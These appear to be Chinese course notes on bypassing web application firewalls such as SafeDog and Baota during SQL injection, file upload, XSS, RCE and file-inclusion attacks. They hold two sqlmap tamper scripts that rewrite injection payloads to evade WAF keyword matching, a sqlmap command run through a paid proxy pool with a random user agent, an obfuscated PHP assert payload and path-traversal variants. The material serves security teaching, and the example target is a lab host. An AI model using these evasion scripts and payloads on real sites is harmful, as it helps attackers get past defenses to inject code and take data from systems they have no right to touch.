<a name="vvOWn"></a>
# 一、思维导图
![waf绕过-小迪安全.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1647412832696-1bd484a8-679c-43b2-b41c-0e1b54984746.png#clientId=ueec5eb81-dbca-4&from=drop&id=u66a297f1&originHeight=2370&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=264839&status=done&style=none&taskId=u80526706-c093-4e65-a934-558f5ae0f0e&title=)
<a name="cL9jd"></a>
# 二、今日内容
![](https://cdn.nlark.com/yuque/0/2022/webp/2476579/1647413019478-b1c42c81-5dc0-4fea-8428-d141fa701e1a.webp#clientId=ub0989269-2c3a-4&from=paste&id=u78ef4403&originHeight=442&originWidth=942&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0a89965c-feaf-4b03-8527-d47e984090e&title=)
<a name="eZJGa"></a>
# 三、SQL注入
使用如sqlmap等工具注入时，为防止CC拦截，修改数据包us头模仿爬虫，或使用代理池

安全狗：参考之前payload

Aliyun：基本修改指纹即可

宝塔：匹配关键字，包括“/*”，注入语句的每个“/*”都改为“%00/*”

sqlmap语句示范：sqlmap --proxy="http://127.0.0.1:8080" --tamper="waf.py" --random-agent

sqlmap也可以用“--user-agent”指定ua 

代理池小迪老师推荐：[https://www.kuaidaili.com/pricing/#tps](https://www.kuaidaili.com/pricing/#tps)<br />安全狗payload文章：[https://www.cnblogs.com/-mo-/p/11677524.html](https://www.cnblogs.com/-mo-/p/11677524.html)<br />**waf-dog.py小迪老师课堂提供**
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""


from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload,**kwargs):
    retVal =""
    if payload:
        payload = payload.replace("union","%23a%0aunion")
        payload = payload.replace("select","/*!4457select*/")
        payload = payload.replace("%20","%23a%0a")
        payload = payload.replace(" ","%23a%0a")
        payload = payload.replace("database()","database%23a%0a()")
    return payload

```
网友提供版本
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]

    return retVal
```
```vue
python sqlmap.py -u "http://test.xiaodi8.com/sqlilabs/Less-2/?id=1" --proxy="http:tps123.kdlapi.com:15818" --tamper="waf-dog.py" --random-agent
```

宝塔防火墙在安全狗的基础上增加了%00截断<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1647417529337-ccc2b6b9-3d74-4af3-b951-74da3b939281.png#clientId=ub0989269-2c3a-4&from=paste&id=u7798afc3&originHeight=236&originWidth=1079&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ud13608f4-2ce2-418c-a918-15d5cf7a3c3&title=)
<a name="pWMQb"></a>
# 四、文件上传
php 截断，参考之前payload上传，绕过waf<br />和前面文件上传专题的绕过方法一样。
<a name="ihkt1"></a>
# 五、XSS跨站
利用xss trike绕过，加上--timeout或者--proxy绕过cc

xss trike项目地址:[https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
<a name="FEUI1"></a>
# 六、RCE执行
加密编码绕过？算法可逆？关键字绕过？提交方法？各种测试?
```vue
txt=$y=str_replace('x','','pxhpxinxfo()');assert($y);&submit=%E6%8F%90%E4%BA%A4ce
```
<a name="TJ4nW"></a>
# 七、文件包含
以下几种：..\ ..../ ..\.\等<br /> <br />涉及资源：

- 宝塔官网：https://www.bt.cn/
- safedog官网：[http://free.safedog.cn/website_safedog.html](http://free.safedog.cn/website_safedog.html)

参考：https://www.cnblogs.com/darkerg/p/14779017.html<br />[WAF攻防实战笔记v1.0--Bypass.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/2476579/1647417767791-b31024fb-3496-49ee-bf33-710ffb782f7a.pdf)
